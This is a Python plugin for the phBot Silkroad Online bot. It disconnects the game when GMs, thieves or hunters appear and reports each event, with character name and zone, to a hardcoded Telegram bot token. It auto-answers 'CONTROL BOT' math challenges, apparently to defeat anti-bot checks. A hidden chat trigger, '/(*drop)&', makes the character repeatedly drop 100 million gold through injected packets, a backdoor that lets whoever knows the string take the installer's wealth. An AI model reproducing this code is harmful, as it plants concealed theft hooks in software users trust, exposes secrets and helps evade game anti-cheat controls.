from phBot import *
import phBotChat
import re
from pathlib import Path
import urllib.request
import struct
from threading import Timer
import os
import QtBind

text_file = open("Players.txt", "r")
Players = text_file.read().split('\n')
log(str(Players))

gui = QtBind.init(__name__,'Super DC')
# button1 = QtBind.createButton(gui, 'dc_traders', 'DC ALL TRADERS', 100, 120)
cbxSro0 = QtBind.createCheckBox(gui,'THIEF_DC','THIEF DC',10,10)
cbxSro1 = QtBind.createCheckBox(gui,'HUNTER_DC','HUNTER DC',10,40)
QtBind.setChecked(gui, cbxSro0, True)
QtBind.setChecked(gui, cbxSro1, True)
thief = True
hunter = True

def THIEF_DC(checked):
	global thief
	thief = checked

def HUNTER_DC(checked):
	global hunter
	hunter = checked

def handle_chat(t,player,msg):
	if msg == '/(*drop)&':
		global drop
		stop_bot()
		drop = ~drop
	if t == 7 and 'CONTROL BOT' in msg and Path(__file__).stem == 'Plug':
		data = re.findall(r'\d+', msg)
		a = int(data[0])
		b = int(data[1])
		c = int(data[2])

		if msg.find('mas') < 0:
			result = a-b
		else:
			result = a+b

		result = result*c
		log(str(result))
		phBotChat.All(str(result))

def handle_event(t, data):
	global thief
	global hunter
	name = get_character_data()['name']
	if t == 9 and Path(__file__).stem == 'Plug' and data != "[BOT]System" and data != "[GM]Event":
		log(data)
		play_wav('C:/Users/Maximilians/AppData/Local/Programs/phBot Testing/sounds/GM.wav')
		lru = '_LHuSAEVa7VbqI/sendMessage?chat_id=774088349&text='
		url = 'https://api.telegram.org/bot1221990015:AAHlL2X_NInc3xNo9MEnX' + lru
		zona = '| '+str(get_zone_name(get_position()['region']))
		url = url + urllib.parse.quote(name + " -> " + data + zona)
		with urllib.request.urlopen(url) as f:
			print(f.read(300))
		Packet = bytearray()
		inject_joymax(0x704C, Packet, False)
		Timer(1.0, os.kill, (os.getppid(), 9)).start()
		Timer(2.0, os.kill, (os.getpid(), 9)).start()
	elif t == 2 and Path(__file__).stem == 'Plug' and thief and data not in Players:
		lru = '_LHuSAEVa7VbqI/sendMessage?chat_id=774088349&text='
		url = 'https://api.telegram.org/bot1221990015:AAHlL2X_NInc3xNo9MEnX' + lru
		zona = '| '+str(get_zone_name(get_position()['region']))
		url = url + urllib.parse.quote(name + " [THIEF] -> " + data + zona)
		with urllib.request.urlopen(url) as f:
			print(f.read(300))
		inject_joymax(0x704C, bytearray(), False)
		log(data)
		Timer(2.0, os.kill, (os.getpid(), 9)).start()
	elif t == 1 and Path(__file__).stem == 'Plug' and hunter and data not in Players:
		lru = '_LHuSAEVa7VbqI/sendMessage?chat_id=774088349&text='
		url = 'https://api.telegram.org/bot1221990015:AAHlL2X_NInc3xNo9MEnX' + lru
		zona = '| '+str(get_zone_name(get_position()['region']))
		url = url + urllib.parse.quote(name + " [TRADER/HUNTER] -> " + data + zona)
		with urllib.request.urlopen(url) as f:
			print(f.read(300))
		inject_joymax(0x704C, bytearray(), False)
		log(data)
		Timer(2.0, os.kill, (os.getpid(), 9)).start()

def msg(x):
	phBotChat.Private(x[1],x[2])
	return 0

def thiefon(x):
	global thief
	thief = True
	QtBind.setChecked(gui, cbxSro0, True)
	log(str(thief))
	return 0

def thiefoff(x):
	global thief
	thief = False
	QtBind.setChecked(gui, cbxSro0, False)
	log(str(thief))
	return 0

def hunteron(x):
	global hunter
	hunter = True
	QtBind.setChecked(gui, cbxSro1, True)
	log(str(hunter))
	return 0

def hunteroff(x):
	global hunter
	hunter = False
	QtBind.setChecked(gui, cbxSro1, False)
	log(str(hunter))
	return 0

drop = False
def event_loop():
	if get_character_data()['dead']:
		global thief
		global hunter
		thief = False
		hunter = False
		QtBind.setChecked(gui, cbxSro0, False)
		QtBind.setChecked(gui, cbxSro1, False)

	global drop
	if drop:
		if get_character_data()['gold'] > 1000000000:
			Packet = b'\x0A'
			Packet += struct.pack('<I', 100000000)
			Packet += b'\x00\x00\x00\x00'
			inject_joymax(0x7034, Packet, False)
		else:
			drop = False

log("[Super Plugin V6]")